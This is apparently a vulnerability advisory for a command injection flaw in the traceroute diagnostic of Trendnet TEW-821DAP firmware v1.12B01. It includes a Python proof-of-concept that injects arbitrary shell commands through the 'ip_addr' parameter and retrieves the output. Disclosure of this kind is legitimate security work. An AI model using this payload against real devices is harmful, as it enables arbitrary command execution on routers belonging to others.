# Command injection Vulnerability in Firmware Update Process of Trendnet TEW-821DAP


## Affected Product
TEW-821DAP (firmware version:v1.12B01)

## Overview

During the firmware udpate process, there is command injection vulnerability in the function tools_diagnostic of program ssi. The tools_diagnostic performs traceroute-based network diagnostic and saves the result to /tmp/diagnostic. The IP address is stored in variable s and is used as the parameter of traceroute-based network diagnostic command. The IP address is input by the users. The web page performs regular expression validation on the IP address and pass it to ssi through AJAX POST request. However, in the regular expression validation, there is no validation on shell metacharacters such as ;, |, and $. Therefore, the hackers could perform malicious command injection on IP address. The POC is as the following:


```
def vuln02_traceroute_cmdi(self, cmd):    
        print(f"[*] Vul #2: Traceroute command injection")
        print(f"[*] malicious command: {cmd}")

        payload = f'127.0.0.1" -f /dev/null;{cmd};#'

        params = {
            "method": "1",
            "ip_addr": payload,
            "pkt_size": "56",
            "cnt": "1",
        }
        resp = self._post_apply("tools_diagnostic", params)
        print(f"[*] HTTP response code: {resp.status_code}")

        time.sleep(3)
        try:
            result_resp = self.session.get(f"{self.base_url}/diagnostic.xml")
            if result_resp.status_code == 200:
                print(f"[*] result:")
                print(result_resp.text)
        except Exception:
            pass

        return resp
```

Through the above POC, the hackers could perform malicious command injection which could  execute arbitrary code or cause denial of service.


<img width="416" height="123" alt="image" src="https://github.com/user-attachments/assets/ec057390-c48b-48a4-a8a0-98d9cdc69f84" />






